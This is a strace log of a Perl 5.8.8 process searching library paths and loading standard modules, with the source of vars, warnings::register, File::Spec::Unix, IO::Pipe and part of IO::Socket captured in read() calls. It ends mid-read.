10562 07:33:34.997426 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997440 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997452 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997467 stat64("/usr/lib/perl5/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997478 stat64("/usr/lib/perl5/vars.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997491 stat64("/usr/share/perl5/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997503 stat64("/usr/share/perl5/vars.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997516 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997527 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997541 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:34.997553 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
10562 07:33:34.997573 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
10562 07:33:34.997586 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc54d8) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:34.997597 _llseek(10, 0, [0], SEEK_CUR) = 0
10562 07:33:34.997614 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
10562 07:33:34.997728 stat64("/etc/perl/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997743 stat64("/etc/perl/warnings/register.pm", 0xbfbc521c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997756 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997769 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfbc521c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997783 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997887 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfbc521c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997929 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997956 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfbc521c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997970 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997983 stat64("/usr/share/perl5/warnings/register.pm", 0xbfbc521c) = -1 ENOENT (No such file or directory)
10562 07:33:34.997997 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.998023 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfbc521c) = -1 ENOENT (No such file or directory)
10562 07:33:34.998037 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfbc530c) = -1 ENOENT (No such file or directory)
10562 07:33:34.998050 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
10562 07:33:35.005264 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
10562 07:33:35.005264 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5028) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.005274 _llseek(11, 0, [0], SEEK_CUR) = 0
10562 07:33:35.005295 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
10562 07:33:35.005458 read(11, "", 4096) = 0
10562 07:33:35.005499 close(11)         = 0
10562 07:33:35.005718 _llseek(10, 1148, [1148], SEEK_SET) = 0
10562 07:33:35.005746 _llseek(10, 0, [1148], SEEK_CUR) = 0
10562 07:33:35.005756 close(10)         = 0
10562 07:33:35.005826 _llseek(8, 594, [594], SEEK_SET) = 0
10562 07:33:35.005841 _llseek(8, 0, [594], SEEK_CUR) = 0
10562 07:33:35.005851 close(8)          = 0
10562 07:33:35.005884 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.005899 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.005918 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.005932 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.005958 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.005998 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006030 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006042 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006056 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006068 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006082 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006095 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006109 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.006122 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
10562 07:33:35.006143 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:35.006158 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.006170 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:35.006188 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
10562 07:33:35.006869 brk(0x8218000)    = 0x8218000
10562 07:33:35.007071 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
10562 07:33:35.007525 read(8, "", 4096) = 0
10562 07:33:35.007573 close(8)          = 0
10562 07:33:35.007762 read(6, "", 4096) = 0
10562 07:33:35.007777 close(6)          = 0
10562 07:33:35.008027 stat64("/etc/perl/IO/Pipe.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008073 stat64("/etc/perl/IO/Pipe.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008104 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008117 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008131 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008144 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008157 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008169 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008182 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008194 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008207 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.008220 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
10562 07:33:35.008241 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:35.008256 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.008267 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:35.008288 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
10562 07:33:35.008984 _llseek(6, 3425, [3425], SEEK_SET) = 0
10562 07:33:35.009011 _llseek(6, 0, [3425], SEEK_CUR) = 0
10562 07:33:35.009024 close(6)          = 0
10562 07:33:35.009090 stat64("/etc/perl/IO/Socket.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009104 stat64("/etc/perl/IO/Socket.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009118 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009132 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009146 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009159 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009187 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009199 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009212 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009224 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfbc602c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009238 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfbc611c) = -1 ENOENT (No such file or directory)
10562 07:33:35.009251 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
10562 07:33:35.009275 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
10562 07:33:35.009290 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5e38) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.009302 _llseek(6, 0, [0], SEEK_CUR) = 0
10562 07:33:35.009319 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 